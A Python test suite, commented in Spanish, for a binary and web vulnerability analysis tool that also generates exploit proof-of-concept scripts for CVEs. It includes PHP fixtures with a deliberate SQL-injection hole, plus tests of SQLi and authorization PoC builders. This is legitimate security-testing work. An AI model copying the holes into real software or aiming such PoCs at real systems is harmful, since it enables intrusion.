    # Regresion: _branch_note marcaba un bloque como "llama a una funcion sensible" (gets/read...)
    # via substring ("d in c"), asi que una llamada a getsockopt()/readlink()/readdir()/pread()
    # (nada que ver con gets()/read() sin limite) se etiquetaba igual como "sink peligroso" en el
    # grafo del informe. Confirmado: "gets" in "getsockopt" es True en Python.
    from binoracle.workflows.cfg import _branch_note
    insns_safe = [{"txt": "call sym.imp.getsockopt", "addr": "0x0"},
                  {"txt": "cmp eax, 0", "addr": "0x1"},
                  {"txt": "je 0x10", "addr": "0x2"}]
    note = _branch_note(insns_safe)
    assert "getsockopt" not in note or "sensible" not in note
    # el verdadero positivo (gets real) SI debe seguir marcandose
    insns_real = [{"txt": "call sym.imp.gets", "addr": "0x0"},
                  {"txt": "cmp eax, 0", "addr": "0x1"},
                  {"txt": "je 0x10", "addr": "0x2"}]
    note2 = _branch_note(insns_real)
    assert "sensible" in note2 and "gets" in note2


def test_autopoc_find_pc_offset_respects_wall_clock_budget():
    # Regresion: find_pc_offset() (busqueda simbolica del offset a RIP, probada ANTES del metodo
    # estatico rapido en _offset_candidates) solo tenia un tope de 400 PASOS, no de tiempo real --
    # un binario dirigido por menu con malloc/free de tamano simbolico puede hacer que UN SOLO paso
    # tarde minutos (Z3 bit-blasting una multiplicacion simbolica: size*count), asi que el tope de
    # pasos no protegia nada. Confirmado con un sample real del proceso: 100% del tiempo dentro de
    # bit_blaster_tpl::mk_const_case_multiplier mientras exploraba un binario de heap real
    # (heapexp), sin terminar ni con 240s de presupuesto EXTERNO (el timeout real estaba mas
    # arriba, en el trainer, no dentro de la propia busqueda). Ahora corta por reloj real.
    import os
    import time
    try:
        import angr  # noqa
    except ImportError:
        return
    from binoracle.workflows.autopoc import find_pc_offset
    b = "samples/bin/heapexp"
    if not os.path.exists(b):
        return
    t0 = time.time()
    find_pc_offset(b, budget_s=5.0)
    elapsed = time.time() - t0
    assert elapsed < 30, f"find_pc_offset tardo {elapsed:.1f}s con budget_s=5 -- el limite no corta"


def test_symbolic_angr_rebases_pie_addresses_for_auto_verify():
    # Regresion CRITICA (misma familia que reachability.py, aqui en el oraculo angr_reachable que
    # usa auto_verify para promocionar hallazgos de 'grounded' a 'verified' en el informe de
    # Auditar): la direccion objetivo NUNCA se rebasaba del espacio de r2 (PIE reportado como si
    # cargase en base 0) al espacio de angr (siempre carga en su propia base fija, ~0x400000),
    # asi que auto_verify jamas podia promocionar NADA en un binario PIE -- el modo de compilacion
    # por defecto hoy en dia. Verificado end-to-end sobre ret2win_pie real.
    import os
    try:
        import angr  # noqa
    except ImportError:
        return
    from binoracle.oracles import build_registry
    from binoracle.store.session import Finding
    from binoracle.workflows.verify import auto_verify
    b = "samples/bin/ret2win_pie"
    if not os.path.exists(b):
        return
    reg = build_registry(b)
    f = Finding(title="Posible desbordamiento via gets", severity="high", verdict="grounded",
               location="gets", evidence="[radare2] call to gets at 0x11e5",
               rationale="...", recommendation="...")
    findings, notes = auto_verify(reg, [f])
    assert findings[0].verdict == "verified", notes


def test_symbolic_angr_reachable_impl_never_hangs_past_its_budget():
    # Bug real encontrado en vivo probando un binario con un bucle (un menu re-mostrado hasta que
    # el usuario elige salir): la busqueda hacia una UNICA llamada bloqueante `simgr.explore(...)`
    # sin ningun limite de tiempo ni de estados activos -- en un binario con un bucle que
    # multiplica caminos sin fin, se quedaba al 100% de CPU minuto tras minuto sin devolver nunca
    # nada (mismo patron de fallo que el `pdg` de r2 sin timeout, arreglado antes en
    # r2session.cmd_timeout). Ahora usa un bucle con deadline + tope de estados activos (ver
    # _reachable_impl, el cuerpo que corre dentro del subproceso de AngrOracle._reachable).
    import time
    from unittest.mock import MagicMock
    import binoracle.oracles.symbolic_angr as sa
    if not sa._HAVE_ANGR:
        return   # angr no instalado en este entorno: se omite

    fake_active = [MagicMock() for _ in range(500)]   # muchos estados activos, como un bucle real
    fake_simgr = MagicMock()
    fake_simgr.active = fake_active
    fake_simgr.found = []          # NUNCA encuentra el objetivo (simula un bucle sin salida)
    fake_simgr.deadended = []
    fake_simgr.explore = MagicMock()   # no-op: no reduce 'active' ni pone 'found'

    fake_proj = MagicMock()
    fake_proj.loader.main_object.pic = False   # sin rebase PIE, para simplificar el mock
    fake_proj.factory.simulation_manager.return_value = fake_simgr

    with __import__("unittest.mock", fromlist=["patch"]).patch.object(
            sa.angr, "Project", return_value=fake_proj):
        t0 = time.time()
        res = sa._reachable_impl("fake.bin", 0x401234, [], budget_s=0.3, max_active=50)
        elapsed = time.time() - t0

    assert elapsed < 3.0, "no debe esperar mucho mas que el budget_s pedido"
    assert res.ok and res.meta.get("reachable") is False
    assert "budget" in res.data.lower() or "NOT reachable" in res.data
    assert fake_simgr.explore.call_count > 1   # de verdad iteró varias veces dentro del budget
    # el tope de max_active se aplico: 'active' se recorto, nunca crecio sin control
    assert len(fake_simgr.active) <= 50


def test_symbolic_angr_reachable_hard_kills_a_subprocess_that_outlives_its_budget(monkeypatch):
    # Complementa el test anterior: _reachable_impl solo protege contra un bucle de llamadas a
    # explore() que NUNCA termina -- pero no puede proteger contra una UNICA llamada a explore()
    # que se bloquea mucho mas de lo normal (resolucion de restricciones dura; confirmado en vivo
    # bajo throttling de CPU severo, un step que deberia tardar ~1s tardo mas de 2 HORAS). Para
    # eso AngrOracle._reachable corre la busqueda en un proceso HIJO y lo MATA si sigue vivo
    # pasado budget_s + margen -- este test lo confirma con un worker real que duerme mucho mas
    # que el budget pedido, en vez de devolver nunca el control al bucle interno.
    import time
    import binoracle.oracles.symbolic_angr as sa
    if not sa._HAVE_ANGR:
        return

    def _slow_worker(binary, target, avoid_list, budget_s, max_active, q):
        time.sleep(600)   # mucho mas que cualquier budget_s razonable de prueba
        q.put(sa.ToolResult(True, "angr", "no deberia llegar aqui"))
    monkeypatch.setattr(sa, "_reachable_worker", _slow_worker)

    oracle = sa.AngrOracle("fake.bin")
    t0 = time.time()
    res = oracle._reachable("0x401234", budget_s=1.0, max_active=50)
    elapsed = time.time() - t0

    assert elapsed < 40.0, "el proceso hijo debe ser forzado a terminar, no esperarse 600s"
    assert res.ok and res.meta.get("reachable") is False
    assert "forzado a terminar" in res.data or "NOT reachable" in res.data


def test_reachability_rebases_pie_addresses_for_angr():
    # Regresion CRITICA: find_input_to/reachable_findings nunca rebasaba la direccion objetivo del
    # espacio de r2 (que en un binario PIE reporta offsets como si la carga fuera en base 0, p.ej.
    # un sink en 0x11a6) al espacio de angr (que SIEMPRE carga en su propia base fija, tipicamente
    # 0x400000). La funcion de rebase existia pero ambas ramas de su condicional devolvian el valor
    # SIN CAMBIOS (no-op) y ademas nunca se llamaba -- el 'target' pedido a angr caia fuera del
    # espacio de direcciones cargado, asi que la busqueda NUNCA podia tener exito: la capacidad de
    # verificacion por angr (el nivel de evidencia mas fuerte del sistema, 'verified') estaba inerte
    # en TODO binario PIE, que es el modo de compilacion por defecto en toolchains modernas.
    import os
    try:
        import angr  # noqa
    except ImportError:
        return                         # angr no instalado en este entorno: se omite
    from binoracle.workflows.reachability import reachable_findings
    b = "samples/bin/ret2win_pie"
    if not os.path.exists(b):
        return                         # corpus se construye con samples/build.sh
    fs = reachable_findings(b, budget_s=25, max_targets=2)
    assert fs, "angr no alcanzo ningun sink en un PIE real -- el rebase sigue roto"
    assert any(f.verdict == "verified" for f in fs)
    # el input concreto recuperado debe ser la contrasena real del reto (prueba de que la busqueda
    # realmente ejecuto el binario correcto, no una direccion aleatoria que resulto alcanzable)
    assert any("sup3rs3cr3t" in f.evidence for f in fs)


def test_reachability_find_input_to_hard_kills_a_subprocess_that_outlives_its_budget(monkeypatch):
    # Bug real encontrado en vivo bajo throttling de CPU severo: un unico `simgr.explore(...)`
    # dentro de _find_input_to_impl tardo mas de 2 HORAS cuando debia tardar ~25s (budget_s=25) --
    # el bucle `while time.time() < deadline` solo comprueba el reloj ENTRE llamadas, asi que no
    # tiene forma de interrumpir una llamada individual que se bloquea mucho mas de lo normal.
    # find_input_to ahora corre la busqueda real en un proceso HIJO y lo MATA si sigue vivo
    # pasado budget_s + margen, convirtiendo budget_s en una cota DURA de verdad.
    import time
    import binoracle.workflows.reachability as rb

    def _slow_worker(binary, target, avoid, stdin_len, budget_s, max_active, q):
        time.sleep(600)
        q.put(rb.ReachResult(ok=True, target=target, note="no deberia llegar aqui"))
    monkeypatch.setattr(rb, "_find_input_to_worker", _slow_worker)

    t0 = time.time()
    res = rb.find_input_to("fake.bin", 0x401234, budget_s=1.0)
    elapsed = time.time() - t0

    assert elapsed < 40.0, "el proceso hijo debe ser forzado a terminar, no esperarse 600s"
    assert res.ok is False
    assert "excedio el presupuesto" in res.note or "no alcanzado" in res.note


def test_authz_drop_must_guard_the_exec_path(tmp_path):
    # Regresion: 'setuid ejecuta comandos sin soltar privilegios' exigia que setuid/setgid/...
    # estuviera AUSENTE en TODO el binario -- un binario con setuid() en una funcion 'safe_path()'
    # que nunca se invoca desde el camino real que hace exec() se consideraba seguro (falso negativo
    # confirmado con un binario real: setuid+printf en una funcion, execl SIN drop en otra, ambas
    # alcanzables desde main segun argv). Ahora exige que el drop este ausente en la MISMA funcion
    # que hace el exec.
    import os
    from binoracle.workflows.authz import scan_authz
    p = tmp_path / "suidbin"; p.write_bytes(b"\x7fELF"); os.chmod(p, 0o4755)

    # execl llamado desde vuln_path; setuid llamado desde una funcion DISTINTA (safe_path) -> inseguro
    reg = _mock_reg(imports="sym.imp.execl\nsym.imp.setuid",
                    callers={"execl": "sym.vuln_path", "setuid": "sym.safe_path"})
    fs = scan_authz(reg, str(p))
    assert any("sin soltar privilegios" in f.title.lower() for f in fs)
    assert any("vuln_path" in f.evidence for f in fs)

    # execl y setuid llamados desde la MISMA funcion -> seguro (orden no se verifica, pero al menos
    # el drop esta en el camino real, que es la mejora minima grounded)
    reg2 = _mock_reg(imports="sym.imp.execl\nsym.imp.setuid",
                     callers={"execl": "sym.main", "setuid": "sym.main"})
    assert not any("ejecuta comandos" in f.title.lower() for f in scan_authz(reg2, str(p)))


def test_hardening_ld_preload_requires_exact_string_value():
    # Regresion: el check de LD_* disparaba con cualquier setenv/putenv + la SUBCADENA "LD_PRELOAD"
    # en cualquier parte de las strings, incluido un texto de ayuda que solo la MENCIONA ("set
    # LD_PRELOAD to use a custom allocator") sin relacion con ninguna llamada real. Ahora exige que
    # el VALOR de un string sea EXACTAMENTE "LD_PRELOAD"/"LD_LIBRARY_PATH" (el nombre de variable
    # real que se pasaria a setenv), no una mencion dentro de una frase.
    from binoracle.workflows.hardening import scan_hardening
    distractor = _mock_reg(imports="sym.imp.setenv",
                           strings="set LD_PRELOAD to use a custom allocator")
    assert not any("entorno" in f.title.lower() for f in scan_hardening(distractor, "x"))
    real = _mock_reg(imports="sym.imp.setenv", strings="LD_PRELOAD")
    assert any("entorno" in f.title.lower() for f in scan_hardening(real, "x"))


def test_hardening_path_relative_was_dead_code():
    # Regresion CRITICA: el check (c) exigia comillas LITERALES ("cmd") en el texto de r2_strings,
    # pero la tabla `izz` de r2 NUNCA envuelve el valor entre comillas (son celdas de tabla) -- este
    # check no pudo dispararse NUNCA en ningun binario real desde que se escribio (falso negativo
    # del 100%, no falso positivo). Confirmado con un binario real: system("ps aux").
    from binoracle.workflows.hardening import scan_hardening
    # _mock_reg envuelve `strings` como filas reales de tabla `izz` (ver su definicion mas arriba):
    # se le pasa el VALOR plano de cada string, una por linea.
    reg = _mock_reg(imports="sym.imp.system", strings="ps aux")
    titles = " ".join(f.title.lower() for f in scan_hardening(reg, "x"))
    assert "path" in titles, titles
    # una frase que solo MENCIONA un nombre de comando (no lo tiene como primer token) no cuenta
    reg2 = _mock_reg(imports="sym.imp.system", strings="usage: pass -v or ps to see status")
    assert not any("path" in f.title.lower() for f in scan_hardening(reg2, "x"))


def test_commsec_prng_detects_bare_import_name():
    # Regresion: el regex de PRNG exigia el prefijo 'sym.imp.rand' que no siempre aparece en la
    # salida real de r2 (algunos binarios listan solo el nombre bare 'rand') -- falso NEGATIVO real,
    # confirmado con un binario sintetico (rand() para un dado de juego). Con imported_names() se
    # detecta sea cual sea el formato de prefijo.
    from binoracle.workflows.commsec import scan_comms
    reg = _mock_reg(imports="1  0x1000  global  func       rand\n2  0x1010  global  func       srand")
    titles = " ".join(f.title.lower() for f in scan_comms(reg, "x"))
    assert "aleatorios" in titles or "prng" in titles.lower()
    # con un CSPRNG real presente, no se marca
    reg2 = _mock_reg(imports="sym.imp.rand", strings="getrandom")
    assert not any("aleatorios" in f.title.lower() for f in scan_comms(reg2, "x"))


def test_fileperms_getenv_exec_requires_same_function():
    # Regresion: getenv+exec en el binario (en cualquier sitio) ya NO basta -- un getenv("LANG") de
    # un saludo y un system() fijo de un helper de backup, sin relacion, no deben dispararse juntos.
    from binoracle.workflows.fileperms import scan_file_perms
    same = _mock_reg(imports="sym.imp.getenv\nsym.imp.system", same_func=True)
    titles_same = " ".join(f.title.lower() for f in scan_file_perms(same, "x"))
    assert "entorno" in titles_same
    diff = _mock_reg(imports="sym.imp.getenv\nsym.imp.system", same_func=False)
    assert scan_file_perms(diff, "x") == []


def test_versions_uses_max_not_first_glibc_match():
    # Regresion: en un binario dinamico, la tabla de simbolos versionados de glibc (.dynstr) repite
    # 'GLIBC_2.2.5' para casi toda funcion base (nivel ABI minimo casi universal), mientras la
    # version real vinculada tambien aparece pero con menos frecuencia. Tomar la PRIMERA coincidencia
    # (.search) casi siempre devolvia 2.2.x, marcando como 'antigua' una glibc moderna real -- se
    # confirmo en 13 de ~20 binarios del corpus (todos compilados con GCC 13, glibc real 2.34).
    from binoracle.workflows.versions import scan_versions
    reg = _mock_reg(strings="GLIBC_2.2.5\nGLIBC_2.2.5\nGLIBC_2.34\nGLIBC_2.2.5\nGLIBC_2.2.6")
    fs = scan_versions(reg, "x", "es")
    titles = " ".join(f.title.lower() for f in fs)
    assert "glibc 2.34" in titles
    assert "antiguo" not in titles, titles       # 2.34 es moderna; no debe marcarse como antigua
    # un binario que SOLO referencia simbolos antiguos (glibc real vieja) SI debe marcarse
    reg2 = _mock_reg(strings="GLIBC_2.2.5\nGLIBC_2.2.5\nGLIBC_2.2.6")
    fs2 = scan_versions(reg2, "x", "es")
    assert any("antiguo" in f.title.lower() for f in fs2)


def test_authcheck_still_detects_real_hardcoded_credential():
    # No basta con no dar falsos positivos: un strcmp contra un identificador con pinta de credencial
    # real (guion bajo, valor no trivial) SIGUE debiendo dispararse, con la evidencia limpia (el
    # valor real, no una fila de tabla cruda con offsets).
    reg = _mock_reg(imports="sym.imp.strcmp",
                    strings="password: \nMASTER_PASSWORD_2024xk")
    from binoracle.workflows.authcheck import scan_auth
    fs = scan_auth(reg, "x", "es")
    assert any("comparacion" in f.title.lower() for f in fs)
    hi = next(f for f in fs if "comparacion" in f.title.lower())
    assert "MASTER_PASSWORD_2024xk" in hi.evidence
    assert "0x0" not in hi.evidence          # evidencia limpia, sin metadatos de tabla cruda


def test_injection_no_false_positive_on_unrelated_gift_function():
    # Regresion sobre binario real: ret2win.c llama system("/bin/sh") FIJO dentro de win(), sin
    # relacion con gets(buf) de main() -- antes del fix, 'entrada + exec en algun sitio' disparaba
    # 'Superficie de inyeccion' en ~60% del corpus de ejemplo (ret2win, canary, oobwrite...).
    import os
    from binoracle.oracles import build_registry
    from binoracle.workflows.injection import scan_injection
    b = "samples/bin/ret2win"
    if not os.path.exists(b):
        return
    reg = build_registry(b)
    fs = scan_injection(reg, b, "es")
    assert not any("inyeccion" in f.title.lower() for f in fs), [f.title for f in fs]


def test_no_false_positives_on_static_binary():
    # Regresion: un binario ESTATICO minimo (solo un overflow) no debe generar falsos positivos de
    # SQLi / cleartext / logging por strings o simbolos de la glibc embebida (caso informe_staticrop).
    import os
    from binoracle.oracles import build_registry
    from binoracle.workflows.injection import scan_injection
    from binoracle.workflows.commsec import scan_comms
    from binoracle.workflows.logging_check import scan_logging
    from binoracle.workflows._binfacts import is_static, has_network, imported_names
    b = "samples/bin/staticrop"
    if not os.path.exists(b):
        return                         # corpus se construye con samples/build.sh
    reg = build_registry(b)
    assert is_static(reg) is True
    assert has_network(reg) is False               # 'bind' de la cabecera de ii NO cuenta como red
    assert not (imported_names(reg) & {"nth", "bind", "vaddr", "name"})  # cabecera no parseada
    fp = (scan_injection(reg, b, "es") + scan_comms(reg, b, "es") + scan_logging(reg, b, "es"))
    titles = [f.title for f in fp]
    assert not any("sql" in t.lower() for t in titles), titles
    assert not any("cifrar" in t.lower() or "cleartext" in t.lower() for t in titles), titles
    assert not any("logging" in t.lower() or "registro" in t.lower() for t in titles), titles


def test_binfacts_parses_import_names():
    from binoracle.workflows._binfacts import imported_names, has_network, _NET_APIS
    # formato mock 'sym.imp.socket' -> nombre bare 'socket'; y red por marcador CURLOPT
    import sys; sys.path.insert(0, "tests")
    from test_tools_and_config import _mock_reg
    reg = _mock_reg(imports="1 0x1 GLOBAL FUNC libc connect\nsym.imp.socket", strings="")
    names = imported_names(reg)
    assert "connect" in names and "socket" in names and "nth" not in names
    assert has_network(reg) is True
    assert has_network(_mock_reg(imports="sym.imp.MD5_Init", strings="CURLOPT_SSL_VERIFYPEER=0")) is True
    assert has_network(_mock_reg(imports="sym.imp.printf", strings="hello")) is False


def test_audit_decompile_vuln_funcs_never_hangs_on_stuck_axtj(monkeypatch, tmp_path):
    # Mismo bug real que reachability._sink_callsites (ver su fix): `axtj @ sym.imp.<sink>` para
    # un simbolo que el binario no importa puede colgar r2pipe indefinidamente -- aqui con una
    # sesion FRESCA (no la cacheada de r2session), que tiene exactamente el mismo riesgo porque
    # usa el mismo mecanismo de pipe persistente. _r2_cmd_timeout debe acotar cada llamada.
    import time
    from binoracle.workflows import audit

    class _FakeProc:
        def __init__(self):
            self.killed = False
        def kill(self):
            self.killed = True

    class _HangingR2:
        def __init__(self):
            self.process = _FakeProc()
        def cmd(self, c):
            if c == "aaa":
                return ""
            if c.startswith("axtj @ sym.imp.gets"):
                time.sleep(25)   # mas que el timeout real de 20s para axtj en _decompile_vuln_funcs
            return ""
        def quit(self):
            pass

    fake = _HangingR2()
    monkeypatch.setattr("r2pipe.open", lambda *a, **kw: fake)
    monkeypatch.setattr(audit, "_OVERFLOW_SINKS", ("read", "gets", "fgets"))

    b = tmp_path / "fake.bin"; b.write_bytes(b"\x7fELF")

    class _FakeLLM:
        def available(self):
            return False

    def fake_decompile_explain(binary, func, llm=None):
        from binoracle.workflows.decompile import DecompiledFunc
        return DecompiledFunc(func=func, raw=f"int {func}(){{}}", engine="pdc")
    monkeypatch.setattr("binoracle.workflows.decompile.decompile_explain", fake_decompile_explain)

    t0 = time.time()
    out = audit._decompile_vuln_funcs(None, str(b), _FakeLLM(), limit=2)
    elapsed = time.time() - t0
    assert elapsed < 30.0, "no debe esperar mucho mas que el timeout real de axtj (20s)"
    assert out, "debe caer a 'main' como fallback cuando axtj no da nada util"
    assert fake.process.killed, "la sesion colgada debe matarse, no quedar zombie"


def test_decompile_func_technical_uses_cmd_timeout_not_raw_cmd(monkeypatch):
    # Parte del barrido "poco a poco": func_technical() llamaba a r.cmd() crudo para afij/afvj/
    # afcf sobre `func`, que no esta pre-validado contra la lista real de simbolos -- mismo
    # riesgo de cuelgue que reachability._sink_callsites si r2 se porta mal con un nombre que
    # no existe. Ahora debe pasar por r2session.cmd_timeout.
    import json as _json
    from binoracle.workflows import decompile as dc
    from binoracle.oracles import r2session

    calls = []
    def fake_cmd_timeout(binary, cmd, timeout):
        calls.append(cmd)
        if cmd.startswith("afij"):
            return _json.dumps([{"bits": 64, "signature": "int vuln(char *buf)",
                                 "stackframe": 64, "calltype": "amd64"}])
        if cmd.startswith("afvj"):
            return _json.dumps({"bp": [{"name": "buf", "type": "char*",
                                        "ref": {"base": "rbp", "offset": -40}}], "sp": [], "reg": []})
        return ""
    monkeypatch.setattr(r2session, "cmd_timeout", fake_cmd_timeout)
    monkeypatch.setattr(r2session, "get", lambda binary: object())

    tech = dc.func_technical("fake.bin", "vuln")
    assert tech.get("signature") == "int vuln(char *buf)"
    assert tech.get("locals") and tech["locals"][0]["name"] == "buf"
    assert all(c.startswith(("afij", "afvj")) for c in calls), (
        "debe usar cmd_timeout para cada consulta, nunca r.cmd() crudo")


def test_decompiled_func_has_ok_property():
    # Regresion: la propiedad `ok` de DecompiledFunc estaba mal ubicada (pegada por error dentro
    # del cuerpo de func_technical(), tras su return, como codigo muerto), asi que la dataclass
    # nunca tenia el atributo. decompile_explain() y _decompile_vuln_funcs() acceden a `d.ok`
    # incondicionalmente, asi que CUALQUIER decompilacion (via CLI o el informe web) lanzaba
    # AttributeError, capturado en silencio y dejando el informe sin la seccion de "Decompilacion
    # anotada" (detectado al regenerar el informe real de Ingrid.exe).
    from binoracle.workflows.decompile import DecompiledFunc
    assert DecompiledFunc(func="main", raw="int main(){}", engine="pdc").ok is True
    assert DecompiledFunc(func="main", raw="   ", engine="pdc").ok is False
    assert DecompiledFunc(func="main").ok is False


def test_classify_cve_web_classes():
    # Regresion: una CVE web (missing authorization, IDOR, SQLi...) caia en 'uaf'/None porque la
    # taxonomia solo cubria clases de memoria. Debe clasificar correctamente y marcarse como web.
    from binoracle.workflows.cveplan import classify_cve, is_web_class
    real_desc = (
        "The Divi Form Builder plugin for WordPress is vulnerable to Missing Authorization in "
        "versions up to, and including, 5.1.8. This is due to the update_user() function accepting "
        "a user ID parameter from form submissions without verifying that the authenticated user "
        "has permission to edit that specific user account, and the handle_register_submission() "
        "function only checking if any user is logged in rather than validating permissions for "
        "the target user."
    )
    assert classify_cve(real_desc) == "missing-authorization"
    assert is_web_class("missing-authorization") is True
    assert is_web_class("stack-overflow") is False
    assert classify_cve("this app is vulnerable to SQL injection via the id parameter") == "sqli"
    assert classify_cve("stored XSS in the comment field") == "xss"
    assert classify_cve("an insecure direct object reference (IDOR) in /api/orders/{id}") == "idor"
    assert classify_cve("SSRF via the webhook URL parameter") == "ssrf"
    assert classify_cve("remote code execution via unauthenticated file upload") in ("rce", "file-upload")
    assert classify_cve("path traversal in the download endpoint") == "path-traversal"
    assert classify_cve("insecure deserialization of untrusted objects") == "deserialization"
    assert classify_cve("XML external entity (XXE) injection") == "xxe"
    assert classify_cve("server-side template injection (SSTI) in the report name") == "ssti"
    assert classify_cve("cross-site request forgery (CSRF) on the password change form") == "csrf"
    assert classify_cve("open redirect via the 'next' parameter") == "open-redirect"


def test_cveplan_plan_skips_pwntools_for_web_class():
    # Regresion: plan() generaba un esqueleto pwntools (process(BINARY) inexistente) incluso para
    # clases web, que no tienen binario que explotar. Debe dejar el script vacio para esa clase;
    # el PoC real lo construye webexploit.build_http_poc con la hipotesis del LLM.
    from binoracle.workflows.cveplan import plan
    pl = plan("missing authorization: the endpoint does not verify permission for the target user")
    assert pl.vuln_class == "missing-authorization"
    assert pl.script == ""
    pl2 = plan("a stack-based buffer overflow in the request parser")
    assert pl2.vuln_class == "stack-overflow"
    assert "pwn" in pl2.script.lower() or "ELF(" in pl2.script


def test_webexploit_builds_valid_poc_for_every_web_class():
    # los PoC web se generan como bash/curl (no Python/requests) -- copiables directo en cualquier
    # terminal con curl, sin depender de python+requests instalados. `bash -n` valida la sintaxis
    # realmente, igual que ast.parse() validaba la version anterior en Python.
    import shutil
    import subprocess
    from binoracle.workflows.webexploit import build_http_poc, WEB_CLASSES
    notes = {"endpoint": "/api/x", "http_method": "POST", "parameters": ["id", "value"],
            "strategy": "test"}
    for cls in sorted(WEB_CLASSES):
        out = build_http_poc(cls, "CVE-TEST-0001", notes, lang="es")
        assert out, f"{cls}: no PoC generated"
        if cls == "csrf":
            assert "<html" in out and "<form" in out
            continue
        assert out.startswith("#!/usr/bin/env bash")
        assert "TU-OBJETIVO-AUTORIZADO" in out    # nunca apunta a un host real por defecto
        if shutil.which("bash"):
            r = subprocess.run(["bash", "-n"], input=out, capture_output=True, text=True)
            assert r.returncode == 0, f"{cls}: bash -n fallo: {r.stderr}"


def test_webexploit_missing_authorization_poc_mentions_user_id_param():
    # Regresion (version Python anterior): la condicion que elegia el parametro del ID objetivo
    # estaba invertida. En la version bash/curl actual no hay una expresion equivalente que
    # "elija" -- el analista sustituye el valor a mano en DATA -- pero el PoC debe seguir
    # orientando hacia 'user_id' cuando ese parametro esta presente en la hipotesis.
    from binoracle.workflows.webexploit import build_http_poc
    notes = {"endpoint": "/x", "http_method": "POST", "parameters": ["user_id", "email"]}
    out = build_http_poc("missing-authorization", "CVE-X", notes, lang="es")
    assert 'user_id' in out
    assert 'TARGET_ID' in out


def test_webexploit_sqli_poc_actually_substitutes_true_false_payloads():
    # bug real encontrado en vivo (una demo real, CVE-2024-1071): el PoC de sqli generado antes
    # definia PAYLOAD_TRUE/PAYLOAD_FALSE pero las dos peticiones de confirmacion usaban el MISMO
    # array DATA sin sustituir ninguno de los dos -- mandaba la peticion IDENTICA dos veces,
    # haciendo inutil la comparacion "true vs false" tal cual se generaba. Ahora cada peticion
    # debe llevar su propio array DATA (DATA_TRUE/DATA_FALSE) con el parametro mas probable de
    # ser el inyectable (por nombre: 'sorting'/'id'/'search'...) ya sustituido por su payload real.
    from binoracle.workflows.webexploit import build_http_poc

    notes = {"endpoint": "/wp-admin/admin-ajax.php?action=x", "http_method": "POST",
            "parameters": ["nonce", "sorting", "directory_id"]}
    out = build_http_poc("sqli", "CVE-2024-1071", notes, lang="es")

    assert '--data-urlencode "sorting=$PAYLOAD_TRUE"' in out
    assert '--data-urlencode "sorting=$PAYLOAD_FALSE"' in out
    # los demas parametros NO se tocan (sigue habiendo que rellenarlos a mano)
    assert '--data-urlencode "nonce=..."' in out
    assert '--data-urlencode "directory_id=..."' in out
    # las dos peticiones usan arrays DIFERENTES -- nunca la misma peticion repetida dos veces
    assert "${DATA_TRUE[@]}" in out and "${DATA_FALSE[@]}" in out
    assert out.count("${DATA_TRUE[@]}") == 1 and out.count("${DATA_FALSE[@]}") == 1


def test_build_http_poc_unknown_class_returns_empty():
    from binoracle.workflows.webexploit import build_http_poc
    assert build_http_poc("stack-overflow", "CVE-X", {}, lang="es") == ""
    assert build_http_poc("not-a-real-class", "CVE-X", {}, lang="es") == ""


def test_websource_grep_vulnerable_functions(tmp_path):
    from binoracle.workflows.websource import grep_vulnerable_functions
    php = tmp_path / "class-form.php"
    php.write_text(
        "<?php\n"
        "class DiviFormHandler {\n"
        "    public function update_user( $user_id, $data ) {\n"
        "        wp_update_user( array('ID' => $user_id) );\n"
        "    }\n"
        "    public function handle_register_submission( $request ) {\n"
        "        if ( is_user_logged_in() ) { $this->update_user( $request['user_id'], $request ); }\n"
        "    }\n"
        "}\n"
    )
    g = grep_vulnerable_functions(str(tmp_path), ["update_user", "handle_register_submission", "nope"])
    assert "update_user" in g["found"] and len(g["found"]["update_user"]) >= 2
    assert "handle_register_submission" in g["found"]
    assert g["not_found"] == ["nope"]
    # evidencia con file:line reales
    m = g["found"]["update_user"][0]
    assert m.file.endswith("class-form.php") and m.line > 0


def test_extract_function_body_balances_braces_and_stops_at_close(tmp_path):
    from binoracle.workflows.websource import extract_function_body
    php = tmp_path / "functions.php"
    php.write_text(
        "<?php\n"
        "function pc_added_uploaded_image(){\n"
        "    $post = $_POST;\n"
        "    if(isset($post['action'])){\n"
        "        echo 'nested';\n"
        "    }\n"
        "    exit();\n"
        "}\n"
        "function another_function(){ /* never included */ }\n"
    )
    body = extract_function_body(str(tmp_path), "functions.php", 2)
    assert body is not None
    assert "pc_added_uploaded_image" in body
    assert "nested" in body
    assert "another_function" not in body


def test_extract_function_body_returns_none_for_missing_file_or_bad_line(tmp_path):
    from binoracle.workflows.websource import extract_function_body
    (tmp_path / "f.php").write_text("<?php\nfunction a(){}\n")
    assert extract_function_body(str(tmp_path), "nope.php", 1) is None
    assert extract_function_body(str(tmp_path), "f.php", 0) is None
    assert extract_function_body(str(tmp_path), "f.php", 999) is None


def test_find_unsafe_sql_concat_sinks_finds_real_bug_confirmed_live(tmp_path):
    # bug real confirmado en vivo, CVE-2024-3552: la hipotesis del LLM citaba
    # 'w2dc_get_map_marker_info' (una consulta YA parametrizada con %d, segura de verdad) --
    # pero el sumidero sin saneo real estaba en OTRA funcion, 'level_filter_where', que ni el
    # LLM ni el PoC publico mencionaban. grep_vulnerable_functions nunca lo iba a encontrar
    # porque no esta buscando ese nombre -- esto busca el PATRON de la inyeccion en todo el
    # plugin, no un nombre ya citado.
    from binoracle.workflows.websource import find_unsafe_sql_concat_sinks
    plugin_dir = tmp_path / "web-directory-free"
    sub = plugin_dir / "classes" / "listings"
    sub.mkdir(parents=True)
    (sub / "listings_manager.php").write_text(
        "<?php\n"
        "function level_filter_join($join = '') {\n"
        "    global $wpdb;\n"
        "    if (isset($_GET['w2dc_level_filter']) && $_GET['w2dc_level_filter'])\n"
        "        $join .= \" LEFT JOIN {$wpdb->w2dc_levels_relationships} AS w2dc_lr\";\n"
        "    return $join;\n"
        "}\n"
        "\n"
        "public function level_filter_where($where = '') {\n"
        "    if (isset($_GET['w2dc_level_filter']) && $_GET['w2dc_level_filter'])\n"
        "        $where .= \" AND (w2dc_lr.level_id=\" . $_GET['w2dc_level_filter'] . \")\";\n"
        "    return $where;\n"
        "}\n"
        "\n"
        "function safe_one($where = '') {\n"
        "    $id = intval($_GET['id']);\n"
        "    $where .= \" AND id=\" . $id;\n"
        "    return $where;\n"
        "}\n")

    sinks = find_unsafe_sql_concat_sinks(str(tmp_path), "web-directory-free")
    assert len(sinks) == 1
    assert sinks[0].function == "level_filter_where"
    assert sinks[0].param == "w2dc_level_filter"
    assert sinks[0].file.endswith("listings_manager.php")


def test_find_unsafe_sql_concat_sinks_empty_when_all_sanitized(tmp_path):
    from binoracle.workflows.websource import find_unsafe_sql_concat_sinks
    plugin_dir = tmp_path / "clean-plugin"
    plugin_dir.mkdir()
